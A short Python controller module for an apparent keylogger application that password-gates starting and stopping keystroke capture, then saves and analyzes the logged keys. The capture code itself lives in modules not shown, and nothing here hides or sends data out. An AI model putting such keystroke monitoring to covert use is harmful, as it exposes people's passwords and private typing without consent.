from app.auth import AuthManager
from app.keylogger import KeyLogger
from app.logger import LogManager
from app.analyzer import KeystrokeAnalyzer

class Controller:
    def __init__(self):
        self.auth = AuthManager()
        self.logger = LogManager()
        self.analyzer = KeystrokeAnalyzer()
        self.keylogger = KeyLogger()
        self.admin_logged_in = False

    def login(self, password):
        self.admin_logged_in = self.auth.verify(password)
        return self.admin_logged_in

    def start_logging(self):
        if self.admin_logged_in:
            self.keylogger.start()

    def stop_logging(self, password):
        if self.auth.verify(password):
            self.keylogger.stop()
            keys = self.keylogger.get_keys()
            self.logger.save_logs(keys)
            analysis = self.analyzer.analyze(keys)
            self.keylogger.clear_keys()
            return True, analysis
        return False, "Incorrect password"
